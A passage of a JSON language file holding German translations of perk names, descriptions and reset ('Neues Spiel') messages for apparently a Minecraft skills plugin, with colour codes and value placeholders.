      ""heavyarmor_perk_2c_description"": ""&7Verbessert &cZorn&7, erhöht die Stärke und Dauer seiner Buffs und halbiert seine Abklingzeit"",
      ""heavyarmor_perk_combo_name"": ""&cKenne deine Schwächen"",
      ""heavyarmor_perk_combo_description"": ""&7Wenn du einen kompletten Satz schwerer Rüstung trägst, erhältst du &c{heavyarmor_setcritchanceresistance_add}&7 kritische Trefferresistenz und &c{heavyarmor_setimmunityfractionbonus_add} zusätzliche Immunität"",
      ""lightarmor_perk_1_name"": ""&eEiserne Nieten"",
      ""lightarmor_perk_1_description"": ""&7Leichte Rüstung wird &e{lightarmor_lightarmormultiplier_add} &7schützender"",
      ""lightarmor_perk_1a_name"": ""&eUnbelastet"",
      ""lightarmor_perk_1a_description"": ""&7Leichte Rüstung verlangsamt dich halb so sehr"",
      ""lightarmor_perk_2a_name"": ""&eResourceful Scout"",
      ""lightarmor_perk_2a_description"": ""&7Du musst nur 3 Teile leichter Rüstung tragen, um von den Bonus-Effekten der leichten Rüstung zu profitieren. Leichte Rüstung verlangsamt dich nicht mehr"",
      ""lightarmor_perk_1b_name"": ""&eKontrollierter Stoffwechsel"",
      ""lightarmor_perk_1b_description"": ""&7Wenn du einen kompletten Satz leichter Rüstung trägst, hast du &e{lightarmor_sethungersavechance_add} &7verringerten Hungerverbrauch. Leichte Rüstung wird &e{lightarmor_lightarmormultiplier_add} &7schützender"",
      ""lightarmor_perk_2b_name"": ""&eReflexe"",
      ""lightarmor_perk_2b_description"": ""&7Wenn du einen kompletten Satz leichter Rüstung trägst, hast du eine &e{lightarmor_setdodgechance_add} &7Chance, einen Angriff auszuweichen. Leichte Rüstung wird &e{lightarmor_lightarmormultiplier_add} &7schützender"",
      ""lightarmor_perk_2_name"": ""&eDrachen-Schuppen"",
      ""lightarmor_perk_2_description"": ""&7Wenn du einen kompletten Satz leichter Rüstung trägst, erhältst du &e{lightarmor_setmagicresistance_add} &7Magie-Schadenswiderstand sowie Immunität gegen &eGift&7, &eBlindheit&7 und &eHunger"",
      ""lightarmor_perk_1c_name"": ""&eAdrenalin"",
      ""lightarmor_perk_1c_description"": ""&7Schaltet &eAdrenalin&7 frei. Wenn du niedrige Gesundheit erreichst, erhältst du kurzzeitig verschiedene mächtige Buffs, um dich aus der Gefahr bringen zu können"",
      ""lightarmor_perk_2c_name"": ""&eBlitz"",
      ""lightarmor_perk_2c_description"": ""&7Verbessert &eAdrenalin&7, erhöht die Stärke und Dauer seiner Buffs und halbiert seine Abklingzeit"",
      ""lightarmor_perk_combo_name"": ""&ePerfekte Haltung"",
      ""lightarmor_perk_combo_description"": ""&7Wenn du einen kompletten Satz leichter Rüstung trägst, erhältst du &e{lightarmor_setcritchanceresistance_add}&7 kritische Trefferresistenz und Betäubungsimmunität"",
      ""farming_perk_1_name"": ""&aSanfte Berührung"",
      ""farming_perk_1_description"": ""&7Schaltet die Fähigkeit frei, Feldfrüchte mit Rechtsklick zu ernten und wieder anzupflanzen"",
      ""farming_perk_2_name"": ""&aMagischer Boden"",
      ""farming_perk_2_description"": ""&7Feldfrüchte wachsen schneller und bringen Erfahrung ein, wenn sie geerntet werden"",
      ""farming_perk_3_name"": ""&aSegnungsreiche Ernte"",
      ""farming_perk_3_description"": ""&7Die Ernte von Feldfrüchten erhöht sich um &a{farming_farmingdrops_add}&7 und bringt noch mehr Erfahrung"",
      ""farming_perk_4_name"": ""&aGöttliche Ernte"",
      ""farming_perk_4_description"": ""&7Die Ernte von Feldfrüchten erhöht sich um &a{farming_farmingdrops_add}&7 und bringt viel Erfahrung"",
      ""farming_perk_5_name"": ""&aAutomatisierte Landwirtschaft"",
      ""farming_perk_5_description"": ""&7Schaltet &aField Harvest&7 frei, eine Fähigkeit, mit der du große Areale von Feldfrüchten fast augenblicklich ernten kannst"",
      ""farming_perk_1a_name"": ""&aTierhaltung"",
      ""farming_perk_1a_description"": ""&7Tiere wachsen &a{farming_growuptimemultiplier_add} &7schneller heran und lassen &a{farming_butcherydrops_add}&7 mehr Gegenstände fallen. Gezüchtete Tiere gewähren &a{farming_breedingexperiencemultiplier_add} &7mehr Erfahrungspunkte"",
      ""farming_perk_2a_name"": ""&aHäuten"",
      ""farming_perk_2a_description"": ""&7Tiere wachsen &a{farming_growuptimemultiplier_add} &7schneller heran und lassen &a{farming_butcherydrops_add}&7 mehr Gegenstände fallen. Gezüchtete Tiere gewähren &a{farming_breedingexperiencemultiplier_add} &7mehr Erfahrungspunkte, und du verursachst &aquadruple &7Schaden an Tieren"",
      ""farming_perk_1b_name"": ""&aImkerei"",
      ""farming_perk_1b_description"": ""&7Bienen greifen dich nicht mehr an. Bienenstöcke haben eine &a{farming_hivehoneysavechance_add} &7Chance, sich nach der Ernte wieder aufzufüllen"",
      ""farming_perk_1c_name"": ""&aUnverträgliche Ernährung"",
      ""farming_perk_1c_description"": ""&7Du wirst gegen giftige/verdorbene Lebensmittel immun und sie sättigen dich &a3x&7, &calle anderen Lebensmittel verlieren aber &4{power_foodbonusvegetable_add}&c Nährwert&7. Sperrt &cAusgewogene Ernährung"",
      ""farming_perk_2c_name"": ""&aAusgewogene Ernährung"",
      ""farming_perk_2c_description"": ""&7Alle Lebensmittel, außer giftige/verdorbene, sättigen dich &a{power_foodbonusvegetable_add} &7mehr. Sperrt &cUnverträgliche Ernährung"",
      ""fishing_perk_1_name"": ""&bGlücklicher Fischer"",
      ""fishing_perk_1_description"": ""&7Erhöht das Fischereiglück um &b{fishing_fishingluck_add}"",
      ""fishing_perk_2_name"": ""&bLeidenschaft der Seen"",
      ""fishing_perk_2_description"": ""&7Erhöht die vom Angeln erhaltenen Erfahrungspunkte um &b{fishing_fishingessencemultiplier_add}"",
      ""fishing_perk_3_name"": ""&bTiefensinne"",
      ""fishing_perk_3_description"": ""&7Lockt Fische &b{fishing_fishingspeedbonus_add} &7schneller an, erhöht das Fischereiglück um &b{fishing_fishingluck_add}"",
      ""fishing_perk_4_name"": ""&bDoppelhaken"",
      ""fishing_perk_4_description"": ""&7Hast eine &b{fishing_fishingdrops_add}&7 Chance, den Fang zu verdoppeln"",
      ""fishing_perk_5_name"": ""&bGoldköder"",
      ""fishing_perk_5_description"": ""&7Lockt Fische &b{fishing_fishingspeedbonus_add} &7schneller an, erhöht das Fischereiglück um &b{fishing_fishingluck_add}"",
      ""fishing_perk_6_name"": ""&bMystrischer Köder"",
      ""fishing_perk_6_description"": ""&7Hast eine &b{fishing_fishingdrops_add}&7 Chance, den Fang zu verdoppeln sowie &b{fishing_fishingessencemultiplier_add} &7mehr Erfahrungspunkte vom Angeln"",
      ""fishing_perk_combo_name"": ""&bTiefsee-Beraubung"",
      ""fishing_perk_combo_description"": ""&7Schaltet die Fähigkeit frei, Werkzeuge und Ausrüstung in ihre Grundbestandteile zu zerlegen"",
      ""power_perk_1a_name"": ""&cVitalität I"",
      ""power_perk_1a_description"": ""&7Maximale Gesundheit &c{power_healthbonus_add}"",
      ""power_perk_2a_name"": ""&cVitalität II"",
      ""power_perk_2a_description"": ""&7Maximale Gesundheit &c{power_healthbonus_add}"",
      ""power_perk_3a_name"": ""&cVitalität III"",
      ""power_perk_3a_description"": ""&7Maximale Gesundheit &c{power_healthbonus_add}"",
      ""power_perk_1b_name"": ""&fEiserne Haut I"",
      ""power_perk_1b_description"": ""&7Natürliche Rüstung &f{power_armorbonus_add}"",
      ""power_perk_2b_name"": ""&fEiserne Haut II"",
      ""power_perk_2b_description"": ""&7Natürliche Rüstung &f{power_armorbonus_add}"",
      ""power_perk_3b_name"": ""&fEiserne Haut III"",
      ""power_perk_3b_description"": ""&7Natürliche Rüstung &f{power_armorbonus_add}"",
      ""power_perk_1c_name"": ""&aGöttliche Gunst I"",
      ""power_perk_1c_description"": ""&7Glück &a{power_luckbonus_add}"",
      ""power_perk_2c_name"": ""&aGöttliche Gunst II"",
      ""power_perk_2c_description"": ""&7Glück &a{power_luckbonus_add}"",
      ""power_perk_3c_name"": ""&aGöttliche Gunst III"",
      ""power_perk_3c_description"": ""&7Glück &a{power_luckbonus_add}"",
      ""power_perk_1d_name"": ""&dRegeneration I"",
      ""power_perk_1d_description"": ""&7Gesundheitsregeneration &d{power_healthregenerationbonus_add}"",
      ""power_perk_2d_name"": ""&dRegeneration II"",
      ""power_perk_2d_description"": ""&7Gesundheitsregeneration &d{power_healthregenerationbonus_add}"",
      ""power_perk_3d_name"": ""&dRegeneration III"",
      ""power_perk_3d_description"": ""&7Gesundheitsregeneration &d{power_healthregenerationbonus_add}"",
      ""power_perk_1e_name"": ""&eStatur I"",
      ""power_perk_1e_description"": ""&7Verursachter Schaden &e{power_attackdamagemultiplier_add}"",
      ""power_perk_2e_name"": ""&eStatur II"",
      ""power_perk_2e_description"": ""&7Verursachter Schaden &e{power_attackdamagemultiplier_add}"",
      ""power_perk_3e_name"": ""&eStatur III"",
      ""power_perk_3e_description"": ""&7Verursachter Schaden &e{power_attackdamagemultiplier_add}"",
      ""power_perk_1f_name"": ""&ePlünderer I"",
      ""power_perk_1f_description"": ""&7Monsterdropp &e{power_entitydropmultiplier_add}"",
      ""power_perk_2f_name"": ""&ePlünderer II"",
      ""power_perk_2f_description"": ""&7Monsterdropp &e{power_entitydropmultiplier_add}"",
      ""power_perk_3f_name"": ""&ePlünderer III"",
      ""power_perk_3f_description"": ""&7Monsterdropp &e{power_entitydropmultiplier_add}"",
      ""power_perk_1g_name"": ""&bEhrgeizig I"",
      ""power_perk_1g_description"": ""&7Abklingzeitverkürzung &b{power_cooldownreduction_add}"",
      ""power_perk_2g_name"": ""&bEhrgeizig II"",
      ""power_perk_2g_description"": ""&7Abklingzeitverkürzung &b{power_cooldownreduction_add}"",
      ""power_perk_3g_name"": ""&bEhrgeizig III"",
      ""power_perk_3g_description"": ""&7Abklingzeitverkürzung &b{power_cooldownreduction_add}"",
      ""heavyarmor_perk_ng1_name"": ""&c&lNeues Spiel I"",
      ""heavyarmor_perk_ng1_description"": ""&7Setzt deine schwere Rüstungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{heavyarmor_heavyarmorexpmultiplier_add}&7. Im Austausch erhältst du permanente &c{heavyarmor_damageresistanceperpiece_add} &7Schadensresistenz und &c{heavyarmor_critchanceresistanceperpiece_add} &7Krit-Resistenz pro Teil schwerer Rüstung"",
      ""heavyarmor_perk_ng2_name"": ""&c&lNeues Spiel II"",
      ""heavyarmor_perk_ng2_description"": ""&7Setzt deine schwere Rüstungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{heavyarmor_heavyarmorexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &c{heavyarmor_damageresistanceperpiece_add} &7Schadensresistenz und &c{heavyarmor_critchanceresistanceperpiece_add} &7Krit-Resistenz pro Teil schwerer Rüstung"",
      ""lightarmor_perk_ng1_name"": ""&e&lNeues Spiel I"",
      ""lightarmor_perk_ng1_description"": ""&7Setzt deine leichte Rüstungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{lightarmor_lightarmorexpmultiplier_add}&7. Im Austausch erhältst du permanente &e{lightarmor_damageresistanceperpiece_add} &7Schadensresistenz und &e{lightarmor_movementspeedperpiece_add} &7Bewegungsgeschwindigkeit pro Teil leichter Rüstung"",
      ""lightarmor_perk_ng2_name"": ""&e&lNeues Spiel II"",
      ""lightarmor_perk_ng2_description"": ""&7Setzt deine leichte Rüstungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{lightarmor_lightarmorexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &e{lightarmor_damageresistanceperpiece_add} &7Schadensresistenz und &e{lightarmor_movementspeedperpiece_add} &7Bewegungsgeschwindigkeit pro Teil leichter Rüstung"",
      ""archery_perk_ng1_name"": ""&e&lNeues Spiel I"",
      ""archery_perk_ng1_description"": ""&7Setzt deine Bogenschützenstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{archery_archeryexpmultiplier_add}&7. Im Austausch erhältst du permanente &e{archery_bowdamagemultiplier_add} &7Fernkampfschaden, &e{archery_inaccuracy_add} &7Ungenauigkeit und &e{archery_bowcritchance_add}&7 Krit-Chance"",
      ""archery_perk_ng2_name"": ""&e&lNeues Spiel II"",
      ""archery_perk_ng2_description"": ""&7Setzt deine Bogenschützenstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{archery_archeryexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &e{archery_bowdamagemultiplier_add} &7Fernkampfschaden, &e{archery_inaccuracy_add} &7Ungenauigkeit und &e{archery_bowcritchance_add}&7 Krit-Chance"",
      ""fishing_perk_ng1_name"": ""&b&lNeues Spiel I"",
      ""fishing_perk_ng1_description"": ""&7Setzt deine Angelstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{fishing_fishingexpmultiplier_add}&7. Im Austausch erhältst du permanente &b{fishing_fishingdrops_add} &7Angeldropp, &b{fishing_fishingluck_add} &7Angelglück und &b{fishing_fishingspeedbonus_add}&7 Angelgeschwindigkeit"",
      ""fishing_perk_ng2_name"": ""&b&lNeues Spiel II"",
      ""fishing_perk_ng2_description"": ""&7Setzt deine Angelstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{fishing_fishingexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &b{fishing_fishingdrops_add} &7Angeldropp, &b{fishing_fishingluck_add} &7Angelglück und &b{fishing_fishingspeedbonus_add}&7 Angelgeschwindigkeit"",
      ""heavyweapons_perk_ng1_name"": ""&c&lNeues Spiel I"",
      ""heavyweapons_perk_ng1_description"": ""&7Setzt deine Schwere-Waffen-Stufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{heavyweapons_heavyweaponsexpmultiplier_add}&7. Im Austausch erhältst du permanente &c{heavyweapons_damagemultiplier_add} &7Angriffskraft, &c{heavyweapons_powerattackfraction_add} &7Kraftangriffskraft und &c{heavyweapons_critchance_add}&7 Krit-Chance"",
      ""heavyweapons_perk_ng2_name"": ""&c&lNeues Spiel II"",
      ""heavyweapons_perk_ng2_description"": ""&7Setzt deine Schwere-Waffen-Stufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{heavyweapons_heavyweaponsexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &c{heavyweapons_damagemultiplier_add} &7Angriffskraft, &c{heavyweapons_powerattackfraction_add} &7Kraftangriffskraft und &c{heavyweapons_critchance_add}&7 Krit-Chance"",
      ""lightweapons_perk_ng1_name"": ""&e&lNeues Spiel I"",
      ""lightweapons_perk_ng1_description"": ""&7Setzt deine Leichte-Waffen-Stufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{lightweapons_lightweaponsexpmultiplier_add}&7. Im Austausch erhältst du permanente &e{lightweapons_damagemultiplier_add} &7Angriffskraft, &e{lightweapons_attackspeedmultiplier_add} &7Angriffsgeschwindigkeit und &e{lightweapons_critchance_add}&7 Krit-Chance"",
      ""lightweapons_perk_ng2_name"": ""&e&lNeues Spiel II"",
      ""lightweapons_perk_ng2_description"": ""&7Setzt deine Leichte-Waffen-Stufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{lightweapons_lightweaponsexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &e{lightweapons_damagemultiplier_add} &7Angriffskraft, &e{lightweapons_attackspeedmultiplier_add} &7Angriffsgeschwindigkeit und &e{lightweapons_critchance_add}&7 Krit-Chance"",
      ""farming_perk_ng1_name"": ""&a&lNeues Spiel I"",
      ""farming_perk_ng1_description"": ""&7Setzt deine Farmingstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{farming_farmingexpmultiplier_add}&7. Im Austausch erhältst du permanente &a{farming_farmingdrops_add} &7Farming- und Metzgerei-Dropp"",
      ""farming_perk_ng2_name"": ""&a&lNeues Spiel II"",
      ""farming_perk_ng2_description"": ""&7Setzt deine Farmingstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{farming_farmingexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &a{farming_farmingdrops_add} &7Farming- und Metzgerei-Dropp"",
      ""digging_perk_ng1_name"": ""&a&lNeues Spiel I"",
      ""digging_perk_ng1_description"": ""&7Setzt deine Grabungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{digging_diggingexpmultiplier_add}&7. Im Austausch erhältst du permanente &a{digging_diggingdrops_add} &7Grabungs-Dropp, &a{digging_diggingluck_add}&7 Grabungsglück und &a{digging_diggingspeedbonus_add} &7Grabungsgeschwindigkeit"",
      ""digging_perk_ng2_name"": ""&a&lNeues Spiel II"",
      ""digging_perk_ng2_description"": ""&7Setzt deine Grabungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{digging_diggingexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &a{digging_diggingdrops_add} &7Grabungs-Dropp, &a{digging_diggingluck_add}&7 Grabungsglück und &a{digging_diggingspeedbonus_add} &7Grabungsgeschwindigkeit"",
      ""woodcutting_perk_ng1_name"": ""&a&lNeues Spiel I"",
      ""woodcutting_perk_ng1_description"": ""&7Setzt deine Holzfällerstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{woodcutting_woodcuttingexpmultiplier_add}&7. Im Austausch erhältst du permanente &a{woodcutting_woodcuttingdrops_add} &7Holzfäller-Dropp und &a{woodcutting_woodcuttingspeedbonus_add} &7Holzfällergeschwindigkeit"",
      ""woodcutting_perk_ng2_name"": ""&a&lNeues Spiel II"",
      ""woodcutting_perk_ng2_description"": ""&7Setzt deine Holzfällerstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{woodcutting_woodcuttingexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &a{woodcutting_woodcuttingdrops_add} &7Holzfäller-Dropp und &a{woodcutting_woodcuttingspeedbonus_add} &7Holzfällergeschwindigkeit"",
      ""mining_perk_ng1_name"": ""&c&lNeues Spiel I"",
      ""mining_perk_ng1_description"": ""&7Setzt deine Abbaustufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{mining_miningexpmultiplier_add}&7. Im Austausch erhältst du permanente &c{mining_miningdrops_add} &7Abbau- und Spreng-Dropp und &c{mining_miningspeedbonus_add} &7Abbaugeschwindigkeit"",
      ""mining_perk_ng2_name"": ""&c&lNeues Spiel II"",
      ""mining_perk_ng2_description"": ""&7Setzt deine Abbaustufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &4{mining_miningexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &c{mining_miningdrops_add} &7Abbau- und Spreng-Dropp und &c{mining_miningspeedbonus_add} &7Abbaugeschwindigkeit"",
      ""alchemy_perk_ng1_name"": ""&d&lNeues Spiel I"",
      ""alchemy_perk_ng1_description"": ""&7Setzt deine Alchemiestufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{alchemy_alchemyexpmultiplier_add}&7. Im Austausch erhältst du permanente &d{alchemy_genericbrewingskill_add} &7Braufertigkeit und &d{alchemy_brewingtimereduction_add} &7Braugeschwindigkeit"",
      ""alchemy_perk_ng2_name"": ""&d&lNeues Spiel II"",
      ""alchemy_perk_ng2_description"": ""&7Setzt deine Alchemiestufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{alchemy_alchemyexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &d{alchemy_genericbrewingskill_add} &7Braufertigkeit und &d{alchemy_brewingtimereduction_add} &7Braugeschwindigkeit"",
      ""enchanting_perk_ng1_name"": ""&b&lNeues Spiel I"",
      ""enchanting_perk_ng1_description"": ""&7Setzt deine Verzauberungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{enchanting_enchantingexpmultiplier_add}&7. Im Austausch erhältst du permanente &b{enchanting_enchantingskill_add} &7Verzauberungsfähigkeit und &b{enchanting_essencemultiplier_add} &7Erfahrungspunkte"",
      ""enchanting_perk_ng2_name"": ""&b&lNeues Spiel II"",
      ""enchanting_perk_ng2_description"": ""&7Setzt deine Verzauberungsstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{enchanting_enchantingexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &b{enchanting_enchantingskill_add} &7Verzauberungsfähigkeit und &b{enchanting_essencemultiplier_add} &7Erfahrungspunkte"",
      ""smithing_perk_ng1_name"": ""&e&lNeues Spiel I"",
      ""smithing_perk_ng1_description"": ""&7Setzt deine Schmiedenstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{smithing_genericexpmultiplier_add}&7. Im Austausch erhältst du permanente &e{smithing_genericcraftingskill_add} &7Bonus auf alle deine Kreationen"",
      ""smithing_perk_ng2_name"": ""&e&lNeues Spiel II"",
      ""smithing_perk_ng2_description"": ""&7Setzt deine Schmiedenstufe wieder auf 0 zurück und reduziert den erhaltenen Erfahrungsgewinn um &c{smithing_genericexpmultiplier_add}&7. Im Austausch erhältst du erneut permanente &e{smithing_genericcraftingskill_add} &7Bonus auf alle deine Kreationen""
    },
      ""stringListTranslations"": {
        ""heavyarmor_perk_ng1_messages"": [
          ""&c✰ &4Neues Spiel I &c✰"",
          ""&c{heavyarmor_heavyarmorexpmultiplier_add} &7Schwere Rüstung EXP"",
          ""&c{heavyarmor_damageresistanceperpiece_add} &7&lPermanent &7Schadensresistenz/Teil"",
          ""&c{heavyarmor_critchanceresistanceperpiece_add} &7&lPermanent &7Krit-Resistenz/Teil""
        ],
        ""heavyarmor_perk_ng2_messages"": [
          ""&c✰ &4Neues Spiel II &c✰"",
          ""&c{heavyarmor_heavyarmorexpmultiplier_add} &7Leichte Rüstung EXP"",
          ""&c{heavyarmor_damageresistanceperpiece_add} &7&lPermanent &7Schadensresistenz/Teil"",
          ""&c{heavyarmor_movementspeedperpiece_add} &7&lPermanent &7Bewegungsgeschwindigkeit/Teil""
        ],
        ""lightarmor_perk_ng1_messages"": [
          ""&e✰ &6Neues Spiel I &e✰"",
          ""&e{lightarmor_lightarmorexpmultiplier_add} &7Leichte Rüstung EXP"",
          ""&e{lightarmor_damageresistanceperpiece_add} &7&lPermanent &7Schadensresistenz/Teil"",
          ""&e{lightarmor_movementspeedperpiece_add} &7&lPermanent &7Bewegungsgeschwindigkeit/Teil""
        ],
        ""lightarmor_perk_ng2_messages"": [
          ""&e✰ &6Neues Spiel II &e✰"",
          ""&e{lightarmor_lightarmorexpmultiplier_add} &7Leichte Rüstung EXP"",
          ""&e{lightarmor_damageresistanceperpiece_add} &7&lPermanent &7Schadensresistenz/Teil"",
          ""&e{lightarmor_movementspeedperpiece_add} &7&lPermanent &7Bewegungsgeschwindigkeit/Teil""
        ],
        ""archery_perk_ng1_messages"": [
          ""&e✰ &6Neues Spiel I &e✰"",
          ""&e{archery_archeryexpmultiplier_add} &7Bogenschützen EXP"",
          ""&e{archery_bowdamagemultiplier_add} &7&lPermanent &7Fernkampfschaden"",
          ""&e{archery_inaccuracy_add} &7&lPermanent &7Ungenauigkeit"",
          ""&e{archery_bowcritchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""archery_perk_ng2_messages"": [
          ""&e✰ &6Neues Spiel II &e✰"",
          ""&e{archery_archeryexpmultiplier_add} &7Bogenschützen EXP"",
          ""&e{archery_bowdamagemultiplier_add} &7&lPermanent &7Fernkampfschaden"",
          ""&e{archery_inaccuracy_add} &7&lPermanent &7Ungenauigkeit"",
          ""&e{archery_bowcritchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""fishing_perk_ng1_messages"": [
          ""&b✰ &9Neues Spiel I &b✰"",
          ""&b{fishing_fishingexpmultiplier_add} &7Angel EXP"",
          ""&b{fishing_fishingdrops_add} &7&lPermanent &7Angeldropp"",
          ""&b{fishing_fishingluck_add} &7&lPermanent &7Angelglück"",
          ""&b{fishing_fishingspeedbonus_add} &7&lPermanent &7Angelgeschwindigkeit""
        ],
        ""fishing_perk_ng2_messages"": [
          ""&b✰ &9Neues Spiel II &b✰"",
          ""&b{fishing_fishingexpmultiplier_add} &7Angel EXP"",
          ""&b{fishing_fishingdrops_add} &7&lPermanent &7Angeldropp"",
          ""&b{fishing_fishingluck_add} &7&lPermanent &7Angelglück"",
          ""&b{fishing_fishingspeedbonus_add} &7&lPermanent &7Angelgeschwindigkeit""
        ],
        ""heavyweapons_perk_ng1_messages"": [
          ""&c✰ &4Neues Spiel I &c✰"",
          ""&4{heavyweapons_heavyweaponsexpmultiplier_add} &7Schwere Waffen EXP"",
          ""&c{heavyweapons_damagemultiplier_add} &7&lPermanent &7Angriffskraft"",
          ""&c{heavyweapons_powerattackfraction_add} &7&lPermanent &7Kraftangriffskraft"",
          ""&c{heavyweapons_critchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""heavyweapons_perk_ng2_messages"": [
          ""&c✰ &4Neues Spiel II &c✰"",
          ""&4{heavyweapons_heavyweaponsexpmultiplier_add} &7Schwere Waffen EXP"",
          ""&c{heavyweapons_damagemultiplier_add} &7&lPermanent &7Angriffskraft"",
          ""&c{heavyweapons_powerattackfraction_add} &7&lPermanent &7Kraftangriffskraft"",
          ""&c{heavyweapons_critchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""lightweapons_perk_ng1_messages"": [
          ""&e✰ &6Neues Spiel I &e✰"",
          ""&c{lightweapons_lightweaponsexpmultiplier_add} &7Leichte Waffen EXP"",
          ""&e{lightweapons_damagemultiplier_add} &7&lPermanent &7Angriffskraft"",
          ""&e{lightweapons_attackspeedmultiplier_add} &7&lPermanent &7Angriffsgeschwindigkeit"",
          ""&e{lightweapons_critchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""lightweapons_perk_ng2_messages"": [
          ""&e✰ &6Neues Spiel II &e✰"",
          ""&c{lightweapons_lightweaponsexpmultiplier_add} &7Leichte Waffen EXP"",
          ""&e{lightweapons_damagemultiplier_add} &7&lPermanent &7Angriffskraft"",
          ""&e{lightweapons_attackspeedmultiplier_add} &7&lPermanent &7Angriffsgeschwindigkeit"",
          ""&e{lightweapons_critchance_add} &7&lPermanent &7Krit-Chance""
        ],
        ""farming_perk_ng1_messages"": [
          ""&a✰ &2Neues Spiel I &a✰"",
          ""&c{farming_farmingexpmultiplier_add} &7Farming EXP"",
          ""&a{farming_farmingdrops_add} &7&lPermanent &7Farming- & Metzgerei-Dropp"",
          ""&a{farming_farmingspeedbonus_add} &7&lPermanent &7Farminggeschwindigkeit""
        ],
        ""farming_perk_ng2_messages"": [
          ""&a✰ &2Neues Spiel II &a✰"",
          ""&c{farming_farmingexpmultiplier_add} &7Farming EXP"",
          ""&a{farming_farmingdrops_add} &7&lPermanent &7Farming- & Metzgerei-Dropp"",
          ""&a{farming_farmingspeedbonus_add} &7&lPermanent &7Farminggeschwindigkeit""
        ],
        ""digging_perk_ng1_messages"": [
          ""&a✰ &2Neues Spiel I &a✰"",
          ""&c{digging_diggingexpmultiplier_add} &7Graben EXP"",
          ""&a{digging_diggingdrops_add} &7&lPermanent &7Grabungs-Dropp"",
          ""&a{digging_diggingluck_add} &7&lPermanent &7Grabungsglück"",
          ""&a{digging_diggingspeedbonus_add} &7&lPermanent &7Grabungsgeschwindigkeit""
        ],
        ""digging_perk_ng2_messages"": [
          ""&a✰ &2Neues Spiel II &a✰"",
          ""&c{digging_diggingexpmultiplier_add} &7Graben EXP"",
          ""&a{digging_diggingdrops_add} &7&lPermanent &7Grabungs-Dropp"",
          ""&a{digging_diggingluck_add} &7&lPermanent &7Grabungsglück"",
          ""&a{digging_diggingspeedbonus_add} &7&lPermanent &7Grabungsgeschwindigkeit""
        ],
        ""woodcutting_perk_ng1_messages"": [
          ""&a✰ &2Neues Spiel I &a✰"",
          ""&c{woodcutting_woodcuttingexpmultiplier_add} &7Holzfällen EXP"",
          ""&a{woodcutting_woodcuttingdrops_add} &7&lPermanent &7Holzfäller-Dropp"",
          ""&a{woodcutting_woodcuttingspeedbonus_add} &7&lPermanent &7Holzfällergeschwindigkeit""
        ],
        ""woodcutting_perk_ng2_messages"": [
          ""&a✰ &2Neues Spiel II &a✰"",
          ""&c{woodcutting_woodcuttingexpmultiplier_add} &7Holzfällen EXP"",
          ""&a{woodcutting_woodcuttingdrops_add} &7&lPermanent &7Holzfäller-Dropp"",
          ""&a{woodcutting_woodcuttingspeedbonus_add} &7&lPermanent &7Holzfällergeschwindigkeit""
        ],
        ""mining_perk_ng1_messages"": [
          ""&c✰ &4Neues Spiel I &c✰"",
          ""&4{mining_miningexpmultiplier_add} &7Abbauen EXP"",
          ""&c{mining_miningdrops_add} &7&lPermanent &7Abbau- & Spreng-Dropp"",
          ""&c{mining_miningspeedbonus_add} &7&lPermanent &7Abbaugeschwindigkeit""
        ],
        ""mining_perk_ng2_messages"": [
          ""&c✰ &4Neues Spiel II &c✰"",
          ""&4{mining_miningexpmultiplier_add} &7Abbauen EXP"",
          ""&c{mining_miningdrops_add} &7&lPermanent &7Abbau- & Spreng-Dropp"",
          ""&c{mining_miningspeedbonus_add} &7&lPermanent &7Abbaugeschwindigkeit""
        ],
        ""alchemy_perk_ng1_messages"": [
          ""&d✰ &5Neues Spiel I &d✰"",
          ""&c{alchemy_alchemyexpmultiplier_add} &7Alchemie EXP"",
          ""&d{alchemy_genericbrewingskill_add} &7&lPermanent &7Braufertigkeit"",
          ""&d{alchemy_brewingtimereduction_add} &7&lPermanent &7Braugeschwindigkeit""
        ],
        ""alchemy_perk_ng2_messages"": [
          ""&d✰ &5Neues Spiel II &d✰"",
